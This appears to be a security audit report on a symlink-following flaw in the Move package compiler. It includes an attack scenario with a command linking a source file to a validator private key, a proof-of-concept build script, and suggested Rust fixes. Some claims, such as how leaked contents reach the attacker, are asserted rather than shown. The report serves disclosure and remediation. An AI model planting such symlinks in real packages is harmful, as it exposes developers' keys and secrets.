# Audit Report

## Title
Symbolic Link Following Vulnerability in Move Package Compiler Enables Arbitrary File Disclosure

## Summary
The Move package compiler unconditionally follows symbolic links when discovering Move source files, allowing an attacker to create malicious Move packages with symlinks that read arbitrary files from the filesystem during compilation. This vulnerability affects developers, CI/CD systems, and potentially validator operators who compile Move packages from untrusted sources.

## Finding Description

The vulnerability exists in the file discovery mechanism used during Move package compilation. When the compiler searches for Move source files in a package's `sources/`, `scripts/`, `tests/`, or `examples/` directories, it uses the `find_move_filenames` function which internally calls `find_filenames`. [1](#0-0) 

This function delegates to the `find_filenames` implementation, which explicitly enables symlink following: [2](#0-1) 

The critical issue is at line 81 where `follow_links(true)` is set, causing the directory traversal to follow symbolic links. When a symlink is encountered:

1. The symlink's path (e.g., `sources/evil.move`) is checked for `.move` extension - this check passes if the symlink name ends in `.move`
2. The file type check verifies the target is a file (following the link)
3. The symlink path is added to the list of files to compile
4. During parsing, the symlink target is opened and read: [3](#0-2) 

When `File::open()` is called on a symlink path, it automatically follows the symlink and opens the target file, reading its contents into the source buffer.

**Attack Scenario - Supply Chain Attack via Malicious Dependency:**

1. Attacker creates a Move package repository on GitHub with a malicious symlink:
   ```bash
   cd sources/
   ln -s /home/user/.aptos/validator_keys/private_key.txt malicious_code.move
   git add malicious_code.move
   git commit -m "Add module"
   ```

2. Victim adds this package as a dependency in their `Move.toml`:
   ```toml
   [dependencies]
   MaliciousPackage = { git = "https://github.com/attacker/malicious-pkg.git", rev = "main" }
   ```

3. When the victim runs `aptos move compile`, the build system:
   - Clones the malicious repository via git (preserving symlinks) [4](#0-3) 
   
   - Resolves dependencies and collects source paths [5](#0-4) 
   
   - Follows the symlink and reads the victim's private key file
   - Attempts to parse the key file contents as Move code, revealing the contents through compilation errors or in the generated compilation artifacts

The victim's sensitive file contents are now accessible to the attacker through:
- Compilation error messages reported back to the attacker
- The compiled bytecode or intermediate compilation artifacts
- Logs or debug output from the build process

## Impact Explanation

This vulnerability represents a **path traversal / arbitrary file read** vulnerability in the Move package compilation toolchain. While it does not directly affect blockchain consensus or on-chain execution (since validators only verify and execute bytecode, not compile source code), it poses significant security risks:

**Potential Impacts:**
- **Information Disclosure**: Arbitrary file reading from developer machines, CI/CD systems, or any environment where Move packages are compiled
- **Supply Chain Attack Vector**: Malicious dependencies can exfiltrate sensitive data during the build process
- **Validator Operator Compromise**: If validator operators compile untrusted Move packages on machines with access to validator keys, those keys could be leaked
- **Secret Exfiltration**: Access to SSH keys, API tokens, configuration files, or any file readable by the compilation process

**Severity Assessment:**
According to the Aptos bug bounty criteria, this does not directly meet "Critical" severity (no direct consensus violation or RCE on validator nodes during normal operation). However, it represents a serious security vulnerability in the development ecosystem that could serve as an initial attack vector for more critical compromises:

- **Medium Severity**: Information disclosure that could lead to credential theft
- **Potential escalation to Critical**: If leaked credentials enable validator compromise or fund theft

The vulnerability affects the security posture of the entire Move development ecosystem and could undermine trust in the package distribution system.

## Likelihood Explanation

**Likelihood: Medium to High**

The attack is straightforward to execute:
- **Low Technical Barrier**: Creating symlinks and publishing to Git requires minimal expertise
- **No Authentication Required**: Attackers can publish malicious packages to public repositories
- **Widespread Impact**: Affects anyone compiling Move packages from untrusted sources
- **Silent Exploitation**: Victims may not notice files being read during compilation

**Attacker Requirements:**
- Ability to publish a Git repository (trivial)
- Social engineering to convince victims to use the malicious package as a dependency
- Or, compromise an existing popular package to inject symlinks

**Victim Requirements:**
- Compile a Move package containing the malicious dependency
- Have sensitive files readable by the compilation process
- Not use sandboxed build environments

Given that dependency chains in modern software development are complex and developers commonly use third-party packages, the likelihood of exploitation is non-trivial.

## Recommendation

**Immediate Fix**: Disable symlink following in the file discovery mechanism: [6](#0-5) 

Change line 81 from:
```rust
.follow_links(true)
```

To:
```rust
.follow_links(false)
```

**Additional Hardening Measures:**

1. **Explicit Symlink Detection**: Before reading any file, check if it's a symlink and reject it:
   ```rust
   use std::fs;
   
   // Before File::open(fname.as_str())
   let metadata = fs::symlink_metadata(fname.as_str())?;
   if metadata.file_type().is_symlink() {
       bail!("Symbolic links are not allowed in Move source files: {}", fname);
   }
   ```

2. **Path Canonicalization with Validation**: Ensure all discovered files reside within the package directory:
   ```rust
   let canonical_path = fs::canonicalize(entry_path)?;
   let canonical_package_root = fs::canonicalize(package_path)?;
   if !canonical_path.starts_with(&canonical_package_root) {
       bail!("File outside package directory: {}", entry_path);
   }
   ```

3. **Documentation**: Warn users about the risks of compiling untrusted Move packages and recommend using sandboxed build environments

4. **Git Clone Safety**: Consider using `git clone --no-hardlinks` or validating cloned repositories for symlinks before compilation

## Proof of Concept

**Setup:**
```bash
# Create a malicious Move package
mkdir -p malicious_package/sources
cd malicious_package

# Create Move.toml
cat > Move.toml << 'EOF'
[package]
name = "MaliciousPackage"
version = "1.0.0"

[addresses]
malicious = "0x1"
EOF

# Create a symlink to a sensitive file (simulated)
echo "SENSITIVE_VALIDATOR_KEY_DATA" > /tmp/secret_key.move
ln -s /tmp/secret_key.move sources/harmless_module.move

# Initialize git repo
git init
git add .
git commit -m "Initial commit"
```

**Exploitation:**
```bash
# Victim creates a project using the malicious dependency
mkdir victim_project
cd victim_project

cat > Move.toml << 'EOF'
[package]
name = "VictimProject"
version = "1.0.0"

[dependencies]
MaliciousPackage = { local = "../malicious_package" }

[addresses]
victim = "0x42"
EOF

mkdir sources
cat > sources/main.move << 'EOF'
module victim::main {
    fun init() {}
}
EOF

# Compile - this will follow the symlink and read /tmp/secret_key.move
aptos move compile
```

**Expected Result:**
The compilation process will read the contents of `/tmp/secret_key.move` via the symlink and attempt to parse it as Move code. The compilation error will reveal the file contents:

```
error: unexpected token
  ┌─ /path/to/malicious_package/sources/harmless_module.move:1:1
  │
1 │ SENSITIVE_VALIDATOR_KEY_DATA
  │ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected 'address', 'module', or 'script'
```

The sensitive data is now exposed in the error message and compilation logs.

**Notes**

This vulnerability is a classic example of **TOCTOU (Time-of-Check-Time-of-Use)** combined with **path traversal** through symlink following. While the immediate impact is limited to information disclosure during development, it represents a significant supply chain security risk that could enable more severe attacks.

The fix is straightforward (disable `follow_links`), and there is no legitimate use case for following symlinks in Move package source directories. All Move source files should be regular files within the package directory structure.

The vulnerability underscores the importance of defense-in-depth in build systems and the need for careful security review of file system operations in compilation toolchains.

### Citations

**File:** third_party/move/move-compiler-v2/legacy-move-compiler/src/parser/mod.rs (L51-53)
```rust
            res.extend(
                find_move_filenames(&[path.as_str()], true)?
                    .into_iter()
```

**File:** third_party/move/move-compiler-v2/legacy-move-compiler/src/parser/mod.rs (L178-181)
```rust
    let mut f = File::open(fname.as_str())
        .map_err(|err| std::io::Error::new(err.kind(), format!("{}: {}", err, fname)))?;
    let mut source_buffer = String::new();
    f.read_to_string(&mut source_buffer)?;
```

**File:** third_party/move/move-command-line-common/src/files.rs (L80-91)
```rust
        for entry in walkdir::WalkDir::new(path)
            .follow_links(true)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            let entry_path = entry.path();
            if !entry.file_type().is_file() || !is_file_desired(entry_path) {
                continue;
            }

            result.push(path_to_string(entry_path)?);
        }
```

**File:** third_party/move/tools/move-package/src/resolution/git.rs (L27-44)
```rust
pub(crate) fn clone(url: &str, target_path: &str, dep_name: PackageName) -> anyhow::Result<()> {
    let status = Command::new("git")
        .args(["clone", url, target_path])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map_err(|_| {
            anyhow::anyhow!("Failed to clone Git repository for package '{}'", dep_name)
        })?;
    if !status.success() {
        return Err(anyhow::anyhow!(
            "Failed to clone Git repository for package '{}' | Exit status: {}",
            dep_name,
            status
        ));
    }
    Ok(())
}
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L758-768)
```rust
    pub fn get_sources(&self, config: &BuildConfig) -> Result<Vec<FileName>> {
        let places_to_look =
            ResolvingPackage::get_source_paths_for_config(&self.package_path, config)?
                .into_iter()
                .map(|p| p.to_string_lossy().to_string())
                .collect::<Vec<_>>();
        Ok(find_move_filenames(&places_to_look, false)?
            .into_iter()
            .map(Symbol::from)
            .collect())
    }
```
